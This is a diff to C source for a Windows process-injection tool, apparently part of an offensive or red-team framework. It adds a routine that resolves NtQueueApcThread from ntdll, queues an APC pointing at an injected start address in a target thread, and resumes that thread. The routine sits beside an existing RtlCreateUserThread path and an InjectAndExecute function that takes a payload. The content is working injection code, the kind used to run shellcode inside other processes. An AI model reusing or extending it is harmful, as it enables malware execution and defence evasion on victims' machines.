@@ -117,6 +117,7 @@ typedef WINBASEAPI BOOL(WINAPI* FN_KERNEL32_VIRTUALPROTECT)(_In_ LPVOID lpAddres
 
 typedef CLIENT_ID *PCLIENT_ID;
 typedef NTSTATUS(NTAPI* FN_NTDLL_RTLCREATEUSERTHREAD)(_In_ HANDLE ProcessHandle, _In_opt_ PSECURITY_DESCRIPTOR SecurityDescriptor, _In_ BOOLEAN CreateSuspended, _In_opt_ ULONG StackZeroBits, _In_opt_ SIZE_T StackReserve, _In_opt_ SIZE_T StackCommit, _In_ PVOID StartAddress, _In_opt_ PVOID Parameter, _Out_opt_ PHANDLE ThreadHandle, _Out_opt_ PCLIENT_ID ClientId);
+typedef NTSTATUS(NTAPI* FN_NTDLL_NTQUEUEAPCTHREAD)(_In_ HANDLE ThreadHandle, _In_ PVOID ApcRoutine, _In_ PVOID ApcRoutineContext OPTIONAL, _In_ PVOID ApcStatusBlock OPTIONAL, _In_ PVOID ApcReserved OPTIONAL);
 
 BOOL IsWow64ProcessEx(HANDLE hProcess)
 {
@@ -231,6 +232,20 @@ BOOL ExecuteViaRtlCreateUserThread(HANDLE hProcess, LPVOID lpStartAddress, LPVOI
 	HANDLE hThread = NULL;
 	_RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, lpStartAddress, lpParameter, &hThread, &ClientId);
 	return hThread != NULL;
+}
+
+BOOL ExecuteViaNtQueueApcThread_s(INJECTION* injection, LPVOID lpStartAddress, LPVOID lpParameter)
+{
+	HMODULE hModule = GetModuleHandleA("ntdll");
+	FN_NTDLL_NTQUEUEAPCTHREAD _NtQueueApcThread = (FN_NTDLL_NTQUEUEAPCTHREAD)GetProcAddress(hModule, "NtQueueApcThread");
+
+	if (_NtQueueApcThread == NULL)
+		return FALSE;
+
+	if (_NtQueueApcThread(injection->thread, lpStartAddress, lpParameter, NULL, NULL) != 0)
+		return FALSE;
+
+	return ResumeThread(injection->thread) != -1;
 }
 
 void InjectAndExecute(INJECTION* injection, char* payload, int size, int pOffset, char* parameter)
